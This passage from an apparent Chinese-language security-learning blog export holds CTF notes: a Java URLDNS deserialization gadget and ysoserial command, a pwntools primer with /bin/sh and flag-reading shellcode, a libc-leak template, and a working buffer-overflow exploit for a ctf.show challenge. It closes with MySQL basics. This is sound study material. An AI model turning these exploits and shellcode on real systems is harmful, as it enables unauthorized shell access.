class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://f054707a-65aa-45cc-99e7-cad09571d639.challenge.ctf.show/&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        code.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        code.set(u, -<span class="number">1</span>);</span><br><span class="line">        map.put(u, url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(map);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">stream1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(map);</span><br><span class="line">        System.out.println(base64String);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用ysoserial</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS &quot;http://f054707a-65aa-45cc-99e7-cad09571d639.challenge.ctf.show/&quot;</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门</title>
    <url>/2023/04/18/pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>[toc]</p>
<p><a href="https://blog.csdn.net/gd_9988/article/details/106744216">ctfshow-pwn新手系列_ctfshow pwn_Rocl5的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/m0_46483584/article/details/110259127">ctfshow pwn题学习笔记_Scarehehe的博客-CSDN博客</a></p>
<h2 id="pwn中的保护"><a href="#pwn中的保护" class="headerlink" title="pwn中的保护"></a>pwn中的保护</h2><p><a href="https://blog.csdn.net/qq_44108455/article/details/104985351">pwn学习—保护机制_gclome的博客-CSDN博客</a></p>
<p><a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
<h2 id="pwntools的使用"><a href="#pwntools的使用" class="headerlink" title="pwntools的使用"></a>pwntools的使用</h2><p><a href="https://blog.csdn.net/A951860555/article/details/110990925">pwntools工具的使用（随时更新中…）___lifanxin的博客-CSDN博客</a></p>
<p>我们本地写一个猜数游戏进行测试用来学习</p>
<p>c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> secretNumber, userGuess;</span><br><span class="line">    <span class="type">int</span> attempts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化随机数生成器</span></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个 1 到 10000 的随机数</span></span><br><span class="line">    secretNumber = rand() % <span class="number">10000</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;猜一个 1 到 10000 之间的数字。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环，直到用户猜到正确的数字</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input your num:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;userGuess);</span><br><span class="line">        attempts++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (userGuess == secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;success！\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;tyr %d times。\n&quot;</span>, attempts);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userGuess &lt; secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;low\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;big\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>linux：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -m32 guessNum.c -o guessNum</span><br></pre></td></tr></table></figure>

<p>在 GCC 编译器中，<code>-m32</code> 是一个编译选项，它指示编译器为 32 位目标架构生成代码。换句话说，它会告诉 GCC 生成 32 位可执行文件，而不是默认的 64 位可执行文件（假设你的系统默认是 64 位的）。</p>
<p>当使用 <code>-m32</code> 选项编译程序时，确保已安装了 32 位库和开发工具。在某些操作系统上，可能需要额外安装这些库和工具。例如，在 Ubuntu 上，你需要安装 <code>gcc-multilib</code> 和 <code>g++-multilib</code> 包，以便在 64 位系统上编译 32 位程序。</p>
<p>玩游戏：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">game = process(<span class="string">&#x27;./guessNum&#x27;</span>)</span><br><span class="line"></span><br><span class="line">game.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lower_bound = <span class="number">1</span></span><br><span class="line">upper_bound = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    guess = (lower_bound + upper_bound) // <span class="number">2</span></span><br><span class="line">    response = game.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">	game.sendline(<span class="built_in">str</span>(guess))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;low&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        lower_bound = guess + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;big&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        upper_bound = guess - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess:&quot;</span>, guess)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error:&quot;</span>, response)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3617</span><br><span class="line">(&#x27;sucess:&#x27;, 9039)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3617)</span><br><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3656</span><br><span class="line">(&#x27;sucess:&#x27;, 1289)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3656)</span><br></pre></td></tr></table></figure>



<h3 id="引入pwntools库"><a href="#引入pwntools库" class="headerlink" title="引入pwntools库"></a>引入pwntools库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 虽然不太符合pylint代码规范</span></span><br><span class="line"><span class="comment"># 但官方也推荐这样引用</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<h3 id="绑定要处理的程序"><a href="#绑定要处理的程序" class="headerlink" title="绑定要处理的程序"></a>绑定要处理的程序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 远程</span></span><br><span class="line"><span class="comment"># remote(ip/hostname, port)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># 注意process中参数一定要有./</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="设置上下文环境"><a href="#设置上下文环境" class="headerlink" title="设置上下文环境"></a>设置上下文环境</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置上下文环境主要用于一些需要上下文的漏洞利用</span></span><br><span class="line"><span class="comment"># 比如：shellcode的生成</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置操作系统</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># 设置32位的体系架构 </span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># 设置64位的体系架构</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 打印交互中的输入和输出</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 也可以直接这样写</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, lod_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空之前的上下文</span></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># 清空之前的上下文并设置为64位的体系架构</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="获取程序输出"><a href="#获取程序输出" class="headerlink" title="获取程序输出"></a>获取程序输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recv()        <span class="comment"># 默认接受最大为4096字节的输出</span></span><br><span class="line">p.recvline()    <span class="comment"># 接受程序的一行输出</span></span><br><span class="line">p.recvall()     <span class="comment"># 接受程序的当前全部输出，直到遇到EOF</span></span><br><span class="line"><span class="comment"># 直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</span></span><br><span class="line">buf = p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)   </span><br></pre></td></tr></table></figure>

<h3 id="payload的构造"><a href="#payload的构造" class="headerlink" title="payload的构造"></a>payload的构造</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pad = cyclic(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 可以用上面的代码替代传统的构造方式 pad = b&quot;A&quot; * 0x10</span></span><br><span class="line"><span class="comment"># 其结果为 b&#x27;aaaabaaacaaadaaa&#x27;</span></span><br><span class="line">offset = cyclic_find(<span class="string">b&quot;daaa&quot;</span>)  <span class="comment"># 找到当前pad的偏移值</span></span><br></pre></td></tr></table></figure>

<h3 id="实现输入"><a href="#实现输入" class="headerlink" title="实现输入"></a>实现输入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;hello!&#x27;</span>      <span class="comment"># python3，payload为字节类型</span></span><br><span class="line">p.sendline(payload)      <span class="comment"># 输入hello! + \n</span></span><br><span class="line">p.send(payload)          <span class="comment"># 输入hello!</span></span><br><span class="line">p.sendafter(<span class="string">&quot;test&quot;</span>, payload)      <span class="comment"># 在接受到test后才发送payload</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;test&quot;</span>, payload)  <span class="comment"># 在接受到test后才发送payload + \n</span></span><br></pre></td></tr></table></figure>

<h3 id="实现交互"><a href="#实现交互" class="headerlink" title="实现交互"></a>实现交互</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启和程序交互的终端</span></span><br><span class="line"><span class="comment"># 一般用于获取到shell的情况</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="获取程序或者libc中的信息"><a href="#获取程序或者libc中的信息" class="headerlink" title="获取程序或者libc中的信息"></a>获取程序或者libc中的信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./program&quot;</span>)  <span class="comment"># 加载样本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)    <span class="comment"># 加载libc</span></span><br><span class="line"></span><br><span class="line">read_addr = pro.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取read函数地址</span></span><br><span class="line">read_plt = pro.plt[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的plt表地址，内容等于symbols[&quot;read&quot;]</span></span><br><span class="line">read_got = pro.got[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的got表地址</span></span><br><span class="line"><span class="comment"># search的参数为字节类型</span></span><br><span class="line"><span class="comment"># 获取字符串的位置</span></span><br><span class="line">str_addr = <span class="built_in">next</span>(pro.search(<span class="string">b&quot;str&quot;</span>))</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取libc中read的固定偏移值</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># 获取/bin/sh的位置</span></span><br></pre></td></tr></table></figure>

<h3 id="shellcode的生成"><a href="#shellcode的生成" class="headerlink" title="shellcode的生成"></a>shellcode的生成</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 汇编代码</span></span><br><span class="line">code = asm(code)        <span class="comment"># opcode，payload中都使用这个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 同上</span></span><br><span class="line">code = asm(code)        <span class="comment"># 同上</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面是执行execve(&quot;/bin/sh\x00&quot;)的shellcode</span></span><br><span class="line"><span class="comment"># 下面展示直接读取flag文件然后打印的shellcode</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">mmap = <span class="number">0x12345678</span>  <span class="comment"># 可读可写内存区域</span></span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code = asm(code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更简洁的写法</span></span><br><span class="line">code = asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>执行，加了print base64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2.7/site-packages/pwnlib/data/includes /dev/stdin</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,&quot;awx&quot;</span><br><span class="line">    .global _start</span><br><span class="line">    .global __start</span><br><span class="line">    .p2align 2</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">        /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">        /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">        push 0x68</span><br><span class="line">        push 0x732f2f2f</span><br><span class="line">        push 0x6e69622f</span><br><span class="line">        mov ebx, esp</span><br><span class="line">        /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">        /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">        push 0x1010101</span><br><span class="line">        xor dword ptr [esp], 0x1016972</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">        push ecx /* null terminate */</span><br><span class="line">        push 4</span><br><span class="line">        pop ecx</span><br><span class="line">        add ecx, esp</span><br><span class="line">        push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">        mov ecx, esp</span><br><span class="line">        xor edx, edx</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push 11 /* 0xb */</span><br><span class="line">        pop eax</span><br><span class="line">        int 0x80</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-IlAesT/step2 /tmp/pwn-asm-IlAesT/step1</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-IlAesT/step3 /tmp/pwn-asm-IlAesT/step4</span><br><span class="line">amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYA=</span><br></pre></td></tr></table></figure>

<h3 id="DynELF泄露libc"><a href="#DynELF泄露libc" class="headerlink" title="DynELF泄露libc"></a>DynELF泄露libc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面展示的是DynELF的使用模板</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="comment"># 这里的代码比较抽象</span></span><br><span class="line">	<span class="comment"># 其实目的就是利用能够回显字符的函数泄露addr，返回地址为start</span></span><br><span class="line">	<span class="comment"># data接受的数据只能是回显的addr地址上的内容，将空字符处理为\x00</span></span><br><span class="line">	payload = padding + addr + start</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DynELF实例，第一个参数为leak函数，第二个为题目的ELF对象</span></span><br><span class="line">d = DynELF(leak, elf=pro)</span><br><span class="line">system = d.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)  <span class="comment"># 泄露出system的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system ====&gt; &quot;</span>, system, <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战链接</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/111638914</span></span><br><span class="line"><span class="comment"># 详细的用法讲解，包括write/puts/printf三个函数的用法和细节处理</span></span><br><span class="line"><span class="comment"># https://www.anquanke.com/post/id/85129</span></span><br></pre></td></tr></table></figure>

<p>后面的不太看得懂了，先不管</p>
<h2 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h2><p>main函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;stack happy!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;32bits\n&quot;</span>);</span><br><span class="line">  <span class="built_in">pwnme</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwnme函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">9</span>]; <span class="comment">// [esp+Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>fgets</code>处存在栈溢出,<code>s</code>距离ebp为0x9,那么覆盖到返回地址的长度还要再加上0x4，然后写0804850F</p>
<p>后门地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804850F                               public stack</span><br><span class="line">.text:0804850F                               stack proc near</span><br><span class="line">.text:0804850F                               ; __unwind &#123;</span><br><span class="line">.text:0804850F 55                            push    ebp</span><br><span class="line">.text:08048510 89 E5                         mov     ebp, esp</span><br><span class="line">.text:08048512 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:08048515 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:08048518 68 30 86 04 08                push    offset command                  ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0804851D E8 8E FE FF FF                call    _system</span><br><span class="line">.text:0804851D</span><br><span class="line">.text:08048522 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048525 90                            nop</span><br><span class="line">.text:08048526 C9                            leave</span><br><span class="line">.text:08048527 C3                            retn</span><br><span class="line">.text:08048527                               ; &#125; // starts at 804850F</span><br><span class="line">.text:08048527</span><br><span class="line">.text:08048527                               stack endp</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28109</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)</span><br><span class="line"><span class="built_in">print</span>(payload) <span class="comment"># aaaaaaaaaaaaa\x0f\x04</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-03"><a href="#pwn-03" class="headerlink" title="pwn 03"></a>pwn 03</h2><p>查看保护</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ checksec stack1</span><br><span class="line">[*] &#x27;/home/ubuntu/Desktop/pwnremote/stack1&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p><strong>可以用<code>puts</code>函数泄露出任意函数的<code>got</code>表地址,从而泄露libc,就可以根据相对偏移getshell</strong></p>
<p>上面这句话没懂，搜下相关东西：</p>
<p><a href="https://blog.csdn.net/Morphy_Amo/article/details/121845113">【PWN学习】如何获取libc基址_查看libc基址_Morphy_Amo的博客-CSDN博客</a></p>
<p><a href="https://www.freesion.com/article/5901691025/">CTF中的PWN——绕canary防护3（选择项+puts带出canary+泄露函数地址计算基地址） - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
<p>明天继续</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>rmi专题</title>
    <url>/2023/04/20/rmi%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<p>[toc]</p>
<p>参考：<a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>mysql_basic</title>
    <url>/2023/03/03/mysql-basic/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="mysql概述"><a href="#mysql概述" class="headerlink" title="mysql概述"></a>mysql概述</h1><h2 id="数据库相关概念"><a href="#数据库相关概念" class="headerlink" title="数据库相关概念"></a>数据库相关概念</h2><table>
<thead>
<tr>
<th>名称</th>
<th>全称</th>
<th>简称</th>
</tr>
</thead>
<tbody><tr>
<td>数据库</td>
<td>存储数据的仓库，数据是有组织的进行存储</td>
<td>DataBase（DB）</td>
</tr>
<tr>
<td>数据库管理系统</td>
<td>操纵和管理数据库的大型软件</td>
<td>DataBase Management System (DBMS)</td>
</tr>
<tr>
<td>SQL</td>
<td>操作关系型数据库的语言，定义了一套操作关系型数据库统一标准</td>
<td>Structured Query Language (SQL)</td>
</tr>
</tbody></table>
<h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>MySQL官方提供了两种不同的版本：</p>
<p> 社区版本（MySQL Community Server） 免费， MySQL不提供任何技术支持 </p>
<p>商业版本（MySQL Enterprise Edition） 收费，可以使用30天，官方提供技术支持</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>略</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h3><p>cmd输入services.msc</p>
<p>找到</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303094200943.png" alt="image-20230303094200943"></p>
<p>控制登录与启动</p>
<p>或者命令行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net start mysql80</span><br><span class="line">net stop mysql80</span><br></pre></td></tr></table></figure>

<h3 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h3><p> 方式一：使用MySQL提供的客户端命令行工具</p>
<p>方式二：使用系统自带的命令行工具执行指令（需要配置系统变量）</p>
